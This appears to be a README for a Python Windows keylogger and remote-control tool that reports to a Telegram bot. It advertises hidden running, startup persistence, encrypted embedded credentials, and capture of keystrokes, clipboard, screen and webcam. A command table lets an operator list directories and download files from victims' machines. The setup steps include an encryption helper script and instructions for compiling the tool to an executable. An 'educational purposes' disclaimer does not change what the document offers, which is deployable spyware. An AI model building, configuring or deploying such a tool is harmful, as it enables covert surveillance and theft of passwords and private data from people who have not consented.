# Advanced Telegram Keylogger & Remote Admin Tool

**Advanced Telegram Keylogger** is a comprehensive monitoring and remote administration tool for Windows. It operates silently in the background, capturing user activity, and allows for remote control via a Telegram bot. All data is sent securely to a designated Telegram chat.

⚠️ **This software is intended for educational and research purposes only. Unauthorized installation on a computer without the owner's consent is illegal. The developer assumes no liability for misuse of this software.**

---

## Features

- **Stealth Operation**: Runs silently in the background with no visible windows or icons.
- **Persistence**: Automatically adds itself to Windows startup to ensure it runs after every reboot.
- **Encrypted Communication**: Bot token and chat ID are encrypted within the script to prevent trivial extraction.
- **Comprehensive Logging**:
    - **Keylogger**: Captures all keystrokes.
    - **Clipboard Monitoring**: Logs all copied text.
    - **System Information**: Collects detailed system, network, and geolocation information.
- **Continuous Surveillance**:
    - **Screen Recording**: Periodically records the screen for a configurable duration (default: 5 minutes).
    - **Webcam Recording**: Periodically records video from the webcam (default: 5 minutes).
- **Remote Administration**: A full suite of commands to manage the remote device via a Telegram bot.
- **Device Management**:
    - Assigns a unique ID to each device (defaulting to the hostname).
    - Supports managing multiple devices from a single Telegram chat.
- **Robust Error Handling**:
    - Ensures video/document uploads are not lost during network errors.
    - Manages concurrent access to the webcam to prevent crashes.

---

## Remote Commands

All commands must be sent to the bot in your Telegram chat. For commands that target a specific device, you must provide the device ID.

| Command | Syntax | Description |
|---|---|---|
| `/devices` | `/devices` | Lists all currently active and reporting devices. |
| `/rename` | `/rename <current_id> <new_id>` | Renames a device. |
| `/screenshot` | `/screenshot <device_id>` | Captures and sends a screenshot of the device's screen. |
| `/camerashot` | `/camerashot <device_id>` | Takes and sends a picture from the device's webcam. |
| `/ls` | `/ls <device_id> [directory_path]` | Lists the contents of the specified directory. If no path is given, it lists the content of the current working directory. |
| `/cd` | `/cd <device_id> <directory_path>` | Changes the current working directory on the remote device. |
| `/getfile` | `/getfile <device_id> <file_path>` | Downloads the specified file from the device. |
| `/help` | `/help` | Shows the list of comands. |

---

## Setup & Configuration

1.  **Clone the Repository**: Download or clone the project to your local machine.

2.  **Install Dependencies**: Install the required Python libraries using pip.
    ```bash
    pip install opencv-python imageio imageio-ffmpeg requests pycountry pynput pyperclip mss numpy cryptography
    ```

3.  **Configure Credentials**:
    The script requires an encrypted Telegram Bot Token and Chat ID. You need to generate these encrypted values and place them in the script.

    *   **Create a Telegram Bot**: Talk to the [BotFather](https://t.me/BotFather) on Telegram to create a new bot and get your `BOT_TOKEN`.
    *   **Get your Chat ID**: Talk to the [userinfobot](https://t.me/userinfobot) on Telegram to get your `CHAT_ID`.
    *   **Encrypt Credentials**: You will need to write a small helper script using the `cryptography` library to encrypt your token and chat ID with the `SECRET_KEY` provided in `keylogger_telegram.py`.

    **Example Encryption Script:**
    '''python
    from cryptography.fernet import Fernet

    # IMPORTANT: Use the EXACT same secret key as in keylogger_telegram.py
    SECRET_KEY = b'aVuzD_TMheAHemOnvrBvkh8f4A3--rTBuf8ERiTV0nk='

    # Your credentials
    BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
    CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'

    f = Fernet(SECRET_KEY)
    encrypted_bot_token = f.encrypt(BOT_TOKEN.encode('utf-8'))
    encrypted_chat_id = f.encrypt(CHAT_ID.encode('utf-8'))

    print(f"ENCRYPTED_BOT_TOKEN = {encrypted_bot_token}")
    print(f"ENCRYPTED_CHAT_ID = {encrypted_chat_id}")
    '''
    *   **Update the Script**: Copy the output from the encryption script and replace the `ENCRYPTED_BOT_TOKEN` and `ENCRYPTED_CHAT_ID` values in `keylogger_telegram.py`.

4.  **Run the Script**:
    ```bash
    python keylogger_telegram.py
    ```
    The script will start running in the background and will begin sending data to your Telegram chat.

5.  **(Optional) Compile to EXE**:
    You can compile the script into a standalone Windows executable using `pyinstaller`.
    ```bash
    pip install pyinstaller
    pyinstaller keylogger_telegram.py
    ```
    The executable will be located in the `dist` folder.

---

## Main Files

-   `keylogger_telegram.py`: The main script containing all the logic.
-   `keyloggerNoWebcam_telegram.py`: The main script without using the webcam.
